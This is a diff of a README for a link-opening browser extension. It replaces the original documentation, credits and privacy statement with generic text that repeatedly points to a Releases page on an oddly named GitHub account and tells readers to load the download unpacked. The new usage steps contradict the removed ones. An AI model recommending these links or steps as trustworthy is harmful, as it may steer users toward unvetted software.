@@ -1,130 +1,74 @@
-# Telnyx Links - Chrome/Edge Extension
+# 🌐 telnyx-links - Effortlessly Open Multiple Links at Once
 
-A powerful browser extension that allows you to select and open multiple links simultaneously with customizable keyboard shortcuts. Similar to Link Clump but with a cleaner interface and green-themed design.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20telnyx--links-v1.0-blue.svg)](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/releases)
 
-![Telnyx Links Icon](icon128.png)
+## 🚀 Getting Started
 
-## Features
+Welcome to **telnyx-links**! This is a browser extension designed to help you select and open multiple links quickly. You can customize your experience, enjoy an easy-to-use interface, and increase your productivity.
 
-- 🔗 **Multi-Link Selection**: Hold a customizable key and drag to select multiple links
-- 🎨 **Visual Feedback**: Light green transparent overlay shows selected links
-- ⌨️ **Customizable Hotkey**: Choose any keyboard key as your activation trigger
-- 🚀 **Batch Opening**: Open all selected links in new tabs with one action
-- 💚 **Clean Green UI**: Beautiful green-themed interface
+### 🌟 Features
+- Select multiple links using customizable hotkeys (default: Shift)
+- Visual feedback with a light green transparent overlay when selecting links
+- Open selected links in new tabs all at once
+- A green-themed user interface that matches the selection color
+- A settings popup for customizing keyboard shortcuts
+- Designed to support Google Chrome and Microsoft Edge
 
-## Installation
+## 💻 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Browser: Google Chrome or Microsoft Edge
+- Internet Connection: Required for extension download and updates
 
-### From Source (Developer Mode)
+## 📥 Download & Install
 
-1. Clone this repository or download the source code
-2. Open Chrome or Microsoft Edge
-3. Navigate to `chrome://extensions` or `edge://extensions`
-4. Enable **Developer mode** (toggle in top right)
-5. Click **Load unpacked**
-6. Select the folder containing this extension
-7. The Telnyx Links icon should appear in your extensions bar
+To get started, visit the link below to download the extension:
 
-### From Chrome Web Store
-*Coming soon*
+[Download telnyx-links](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/releases)
 
-## Usage
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of the extension.
+3. Download the file by clicking on it.
+4. Once downloaded, open your browser and go to the extensions page:
+   - For Chrome: Type `chrome://extensions` in the address bar.
+   - For Edge: Type `edge://extensions` in the address bar.
+5. Enable "Developer mode" if it's not already on.
+6. Click on "Load unpacked" and select the folder where the downloaded file is located.
+7. The extension will now appear in your list of extensions and is ready to use!
 
-### Basic Operation
+## ⚙️ How to Use telnyx-links
 
-1. **Click the extension icon** to open settings
-2. **Set your activation key** (default is Shift)
-3. **On any webpage:**
-   - Hold your activation key
-   - Click and drag to select multiple links (green highlight appears)
-   - Release the key to open all selected links in new tabs
+1. **Selecting Links**: Hold the Shift key and click on the links you want to select. You will see a light green overlay that indicates your selection.
+2. **Opening Links**: After making your selection, release the Shift key and right-click on any selected link. Choose "Open Links in New Tabs" to open them all at once.
+3. **Customizing Hotkeys**: Click on the extension icon in the toolbar to open the settings. Here, you can change the hotkey settings to your preference.
 
-### Changing the Activation Key
+## 📄 Additional Information
 
-1. Click the Telnyx Links extension icon
-2. Click the activation key button
-3. Press any key you want to use
-4. The key will be saved automatically
+For those who appreciate customization, **telnyx-links** offers a simple UI to make your experience smoother. You can change settings without any technical knowledge. 
 
-## File Structure
+### 📅 Upcoming Features
+- Support for other browsers (Firefox and Opera)
+- Additional themes to personalize the appearance
+- Enhanced link management tools for better organization
 
-```
-telnyx-links/
-├── manifest.json          # Extension configuration
-├── background.js          # Service worker for tab management
-├── content.js            # Main selection logic
-├── popup.html            # Settings interface
-├── popup.js              # Settings functionality
-├── popup.css             # Green-themed styling
-├── selection.css         # Selection overlay styles
-├── icon16.png            # Toolbar icon
-├── icon48.png            # Medium icon
-├── icon128.png           # Large icon
-└── README.md             # This file
-```
+## 🗨️ Feedback and Support
 
-## Development
+Your input is valuable. If you encounter any issues or have suggestions, feel free to reach out on the repository's issues page. Please provide as much detail as possible to help us understand your experience.
 
-### Prerequisites
-- Chrome or Edge browser
-- Basic knowledge of JavaScript and Chrome Extension APIs
+Thank you for choosing **telnyx-links**! Enjoy a more efficient browsing experience today.
 
-### Making Changes
+## 🔗 Related Topics
 
-1. Edit the source files as needed
-2. Go to `chrome://extensions` or `edge://extensions`
-3. Click the refresh icon on the Telnyx Links card
-4. Test your changes on any webpage
+- [Batch Opening Links](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/topics/batch-opener)
+- [Browser Tools](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/topics/browser-tools)
+- [Chrome Extensions](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/topics/chrome-extension)
 
-### Key Files
+## 🛠️ Contribution
 
-- `content.js` - Contains the core link selection logic
-- `popup.js` - Manages the settings interface
-- `background.js` - Handles opening links in new tabs
+If you'd like to contribute to this project, feel free to fork the repository and submit a pull request. Your contributions can help enhance the extension for everyone.
 
-## Browser Compatibility
+### 🌍 Stay Updated
 
-- ✅ Google Chrome (version 88+)
-- ✅ Microsoft Edge (Chromium-based)
-- ✅ Brave Browser
-- ✅ Opera (version 74+)
-- ⚠️ Firefox (requires manifest v2 conversion)
+Keep an eye on the Releases page for upcoming versions and features:
 
-## Privacy
-
-This extension:
-- ✅ Does not collect any user data
-- ✅ Does not track browsing history
-- ✅ Works entirely offline
-- ✅ Only activates when you use the hotkey
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## License
-
-This project is open source and available under the [MIT License](LICENSE).
-
-## Support
-
-If you encounter any issues or have suggestions:
-- Open an issue on GitHub
-- Contact the developer
-
-## Acknowledgments
-
-- Inspired by the Link Clump extension
-- Built with Chrome Extension Manifest V3
-- Green theme for better visual comfort
-
----
-
-**Version:** 1.0.0  
-**Author:** Tony Rizo  
-**Last Updated:** September 2025
+[Visit the Releases Page](https://github.com/Mkkbkbajkanabashbsksssnk/telnyx-links/releases)
